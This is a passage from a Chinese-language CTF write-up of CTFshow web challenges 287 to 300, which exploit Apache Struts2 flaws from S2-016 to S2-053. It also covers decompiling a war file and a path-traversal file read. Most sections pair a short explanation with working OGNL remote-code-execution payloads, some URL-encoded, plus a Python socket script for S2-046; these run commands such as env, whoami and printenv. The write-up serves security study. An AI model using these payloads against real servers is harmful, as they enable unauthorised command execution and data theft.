+<p>似乎flag没在env里面，或者可能是输出有限制。感觉是输出有限制，因为结尾没有输出完全，那换个方法。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692540843538-b2af1750-19f1-42c0-9349-590ec3e4fa1e.png" alt="image.png"><br>气死我了，怎么写都输出不来后半段总是识别不出来。妈的工具一把嗦。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692540864123-aea0c64b-79f9-4d6a-8fe3-e5be0d1ef63c.png" alt="image.png"><br>妈的 上面那个payload重新启动容器就ok了：<br>URL转义下方内容：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">$&#123;#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]&#x3D;false,#m&#x3D;#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q&#x3D;@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;printenv | grep FLAG&#39;).getInputStream()),#q&#125;.action</code></pre>
+<h1 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h1><h3 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h3><p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令<br>所以，访问<a target="_blank" rel="noopener" href="http://your-ip:8080/index.action?redirect:OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8COGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F">http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式</a><br>影响版本: 2.0.0 - 2.3.15<br>poc：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;false,#f&#x3D;#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a&#x3D;@java.lang.Runtime@getRuntime().exec(&quot;uname -a&quot;).getInputStream(),#b&#x3D;new java.io.InputStreamReader(#a),#c&#x3D;new java.io.BufferedReader(#b),#d&#x3D;new char[5000],#c.read(#d),#genxor&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125;</code></pre>
+<h1 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h1><h3 id="S2-019"><a href="#S2-019" class="headerlink" title="S2-019"></a>S2-019</h3><p>动态方法调用的默认启用，原理类似于s2-008<br>Apache Struts 2的“Dynamic Method Invocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码<br>与s2-008poc区别不同的仅仅是由原先的[“allowStaticMethodAccess”]&#x3D;true静态方法执行改为(new java.lang.ProcessBuilder(‘id’)).start()，但该方法在虚空浪子心提出s2-012后不久就在博客里说明了官方修补方案将allowStaticMethodAccess取消了后的替补方法就是使用ava.lang.ProcessBuilder<br>影响版本：Struts 2.0.0 - Struts 2.3.15.1<br>poc：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">?debug&#x3D;command&amp;expression&#x3D;#a&#x3D;(new java.lang.ProcessBuilder(&#39;id&#39;)).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#out&#x3D;#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()
+&#x2F;&#x2F; 利用是先进行url编码    </code></pre>
+<pre class="language-markup" data-language="markup"><code class="language-markup">?debug&#x3D;command
+&amp;expression&#x3D;%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%27%65%6e%76%27%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6f%75%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%65%29%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%0a</code></pre>
+<p>这里用那个printenv就不行</p>
+<h1 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h1><h3 id="S2-029"><a href="#S2-029" class="headerlink" title="S2-029"></a>S2-029</h3><p>Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估<br>例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%{}”。最终造成二次执行<br>影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）<br>poc：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">default.action?message&#x3D;(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream()))</code></pre>
+<p>payload：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">default.action?message&#x3D;(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;env&#39;).getInputStream()))</code></pre>
+<h1 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h1><h3 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h3><p>漏洞原理<br>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:<name>的方式来调用名字是<name>的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞<br>影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)<br>poc：</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;env
+</code></pre>
+<h1 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h1><h3 id="S2-033"><a href="#S2-033" class="headerlink" title="S2-033"></a>S2-033</h3><p>漏洞原理<br>当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行<br>影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">orders&#x2F;4&#x2F;%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj&#x3D;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content&#x3D;2908&amp;command&#x3D;env</code></pre>
+<h1 id="web292"><a href="#web292" class="headerlink" title="web292"></a>web292</h1><h3 id="S2-037"><a href="#S2-037" class="headerlink" title="S2-037"></a>S2-037</h3><p>漏洞原理<br>当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式<br>影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">&#x2F;orders&#x2F;3&#x2F;%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj&#x3D;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content&#x3D;2908&amp;command&#x3D;whoami</code></pre>
+<h1 id="web293"><a href="#web293" class="headerlink" title="web293"></a>web293</h1><h3 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h3><p>漏洞原理<br>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵<br>恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令<br>影响版本：Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup">Content-Type: &quot;%&#123;(#nike&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;whoami&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot; boundary&#x3D;----WebKitFormBoundaryXx80aU0pu6vrsV3z
+</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692543378438-72c29cb1-e05a-4f01-b514-425e311a76a2.png" alt="image.png"></p>
+<h1 id="web294"><a href="#web294" class="headerlink" title="web294"></a>web294</h1><h3 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h3><p>漏洞原理<br>与s2-045类似，但是输入点在文件上传的filename值位置，并需要使用\x00截断<br>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10<br>这里wp用的是用socket发包：</p>
+<pre class="language-python" data-language="python"><code class="language-python">import socket
+
+q &#x3D; b&#39;&#39;&#39;------WebKitFormBoundaryXd004BVJN9pBYBL2
+Content-Disposition: form-data; name&#x3D;&quot;upload&quot;; filename&#x3D;&quot;%&#123;#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;X-Test&#39;,233*233)&#125;\x00b&quot;
+Content-Type: text&#x2F;plain
+
+foo
+------WebKitFormBoundaryXd004BVJN9pBYBL2--&#39;&#39;&#39;.replace(b&#39;\n&#39;, b&#39;\r\n&#39;)
+p &#x3D; b&#39;&#39;&#39;POST &#x2F; HTTP&#x2F;1.1
+Host: localhost:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;56.0.2924.87 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
+Accept-Language: en-US,en;q&#x3D;0.8,es;q&#x3D;0.6
+Connection: close
+Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryXd004BVJN9pBYBL2
+Content-Length: %d
+
+&#39;&#39;&#39;.replace(b&#39;\n&#39;, b&#39;\r\n&#39;) % (len(q), )
+
+with socket.create_connection((&#39;your-ip&#39;, &#39;8080&#39;), timeout&#x3D;5) as conn:
+    conn.send(p + q)
+    print(conn.recv(10240).decode())
+</code></pre>
+<p>这个包没太发明白，过段时间在研究一下。<br>工具一把梭。</p>
+<h1 id="web295"><a href="#web295" class="headerlink" title="web295"></a>web295</h1><h3 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h3><p>漏洞原理<br>漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用<br>而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击<br>影响版本: 2.0.0 - 2.3.32<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692544961840-aeae9959-6449-4b32-9af1-ab5eda4bdcf6.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692545103687-b986fa24-bac8-4ea5-9cca-49abb3bad411.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692545142685-a66d184c-60e4-43f5-9103-5e0549c8f1df.png" alt="image.png"><br>佬のpoc：</p>
+<pre class="language-java" data-language="java"><code class="language-java">%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q&#x3D;@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())).(#q)&#125;
+</code></pre>
+<p>把后面的id改为env会报错，但是看着这么眼熟，像是flag。提交之后发现真是对的：<img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692545401365-19dcf5d2-9d24-48e5-abfc-36b0079b8602.png" alt="image.png"><br>还可以用45的content-type</p>
+<pre class="language-java" data-language="java"><code class="language-java">%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</code></pre>
+<h1 id="web296"><a href="#web296" class="headerlink" title="web296"></a>web296</h1><h3 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h3><p>漏洞原理<br>Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型，有如下映射表：</p>
+<table>
+<thead>
+<tr>
+<th>扩展名</th>
+<th>Content-Type</th>
+<th>解析方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>xml</td>
+<td>application&#x2F;xml</td>
+<td>xstream</td>
+</tr>
+<tr>
+<td>json</td>
+<td>application&#x2F;json</td>
+<td>jsonlib或jackson(可选)</td>
+</tr>
+<tr>
+<td>xhtml</td>
+<td>application&#x2F;xhtml+xml</td>
+<td>无</td>
+</tr>
+<tr>
+<td>无</td>
+<td>application&#x2F;x-www-form-urlencoded</td>
+<td>无</td>
+</tr>
+<tr>
+<td>无</td>
+<td>multipart&#x2F;form-data</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<p>jsonlib无法引入任意对象，而xstream在默认情况下是可以引入任意对象的（针对1.5.x以前的版本），方法就是直接通过xml的tag name指定需要实例化的类名：</p>
+<pre class="language-none"><code class="language-none">&lt;classname&gt;&lt;&#x2F;classname&gt;
+&#x2F;&#x2F;或者
+&lt;paramname class&#x3D;&quot;classname&quot;&gt;&lt;&#x2F;paramname&gt;</code></pre>
+<p>所以，我们可以通过反序列化引入任意类造成远程命令执行漏洞，只需要找到一个在Struts2库中适用的gedget<br>影响版本：Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md</a><br>建议直接工具启动！</p>
+<h1 id="web297"><a href="#web297" class="headerlink" title="web297"></a>web297</h1><h3 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h3><p>漏洞原理<br>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞<br>poc</p>
+<pre class="language-none"><code class="language-none">%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;printenv | grep FLAG&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;
+</code></pre>
+<h1 id="web298"><a href="#web298" class="headerlink" title="web298"></a>web298</h1><blockquote>
+<p>工具：<a target="_blank" rel="noopener" href="https://github.com/java-decompiler/jd-gui/releases">https://github.com/java-decompiler/jd-gui/releases</a></p>
+</blockquote>
+<h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>提示：看看代码，了解下和php不一样的地方<br>题目附件一个war包<br>jar包和war包都可以看成压缩文件，都可以用解压软件打开，jar包和war包都是为了项目的部署和发布，通常在打包部署的时候，会在里面加上部署的相关信息。这个打包实际上就是把代码和依赖的东西压缩在一起，变成后缀名为.jar和.war的文件，就是我们说的jar包和war包。但是这个“压缩包”可以被编译器直接使用，把war包放在tomcat目录的webapp下，tomcat服务器在启动的时候可以直接使用这个war包。通常tomcat的做法是解压，编译里面的代码，所以当文件很多的时候，tomcat的启动会很慢。<br>jar包和war包的区别：jar包是java打的包，war包可以理解为javaweb打的包，这样会比较好记。jar包中只是用java来写的项目打包来的，里面只有编译后的class和一些部署文件。而war包里面的东西就全了，包括写的代码编译成的class文件，依赖的包，配置文件，所有的网站页面，包括html，jsp等等。一个war包可以理解为是一个web项目，里面是项目的所有东西。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692546287592-358916c4-a359-4a79-b07b-32ae6fb35c9c.png" alt="image.png"><br>然后去看这个getVipStatus：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547078594-3886eb60-120b-4d06-b79e-d8cfe8206fd1.png" alt="image.png"><br>但是不知道在哪里加入username和password，看了wp发现是在：</p>
+<pre class="language-none"><code class="language-none">&#x2F;ctfshow&#x2F;login?username&#x3D;admin&amp;password&#x3D;ctfshow</code></pre>
+<p>但是不知道这个路径是哪里来的。</p>
+<h1 id="web299"><a href="#web299" class="headerlink" title="web299"></a>web299</h1><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547324053-0afe36c1-6e1c-4a6b-a225-cd24938ac84d.png" alt="image.png"><br>访问之后发现页面没变化，感觉像是文件读取。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547431499-7895a6b5-2af5-4057-97c9-a837ecb8de82.png" alt="image.png"><br>确实可以读取，按照上一道题的文件内容访问一下。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547505252-22399b93-619d-49a0-9b4f-7bfe36fe2c57.png" alt="image.png"><br>终于懂了他这个路径了：<br>访问<code>WEB-INF/classes/com/ctfshow/servlet/GetFlag.class</code><br>发现疑似flag文件：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547630499-b459228b-a93a-428f-92ff-6a283f7fea98.png" alt="image.png"><br>访问<code>/fl3g</code>得目录穿越一下<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547692626-234dd616-bf9d-4eb3-9003-4431915f9fc8.png" alt="image.png"></p>
+<h1 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h1><p>类似上题，但是文件名为<code>/f1bg</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547796528-d30aa8b6-7ed2-48d8-8352-c0651a92428e.png" alt="image.png"></p>
+
+                        </article>
+                    </div>
+
+
+                    <div class="fleet-content-body-footer">
+                        <!--翻页器-->
+                        <div class="flex-row flex w-full justify-between">
+                            <div class="fleet-content-body-footer-left">
+                                
+                                    <div><a href="/posts/659d759f/"
+                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
+                                            </svg>
+                                            <div class="flex flex-col items-start"><span
+                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
+                                                <span>web361-w</span></div>
+                                        </a></div>
+                                
+                            </div>
+                            <div class="fleet-content-body-footer-right">
+                                
+                                    <div><a href="/posts/a574213f/"
+                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <div class="flex flex-col items-end"><span
+                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
+                                                <span>web254-web278反序列化篇</span></div>
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
+                                            </svg>
+                                        </a></div>
+
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+    <!--    嵌套位置结束-->
+
+
+
+
+
+    <!--<h3>categories</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/CTF/">-->
+    <!--                CTF-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/Python/">-->
+    <!--                Python-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+
+    <!--<h3>tags</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/WriteUp/">-->
+    <!--                WriteUp-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CISCN/">-->
+    <!--                CISCN-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/valorant/">-->
+    <!--                valorant-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/genshin/">-->
+    <!--                genshin-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Shortcut/">-->
+    <!--                Shortcut-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
+    <!--                语雀-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
+    <!--                脚本-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CTFshow0-1/">-->
+    <!--                CTFshow0-1-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Tampermonkey/">-->
+    <!--                Tampermonkey-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+</div>
+<!--返回顶部按钮-->
+<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
+<!--加个渐变，但还是有点丑-->
+<!-- TODO 换个更好的方案-->
+<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
+</div>
+
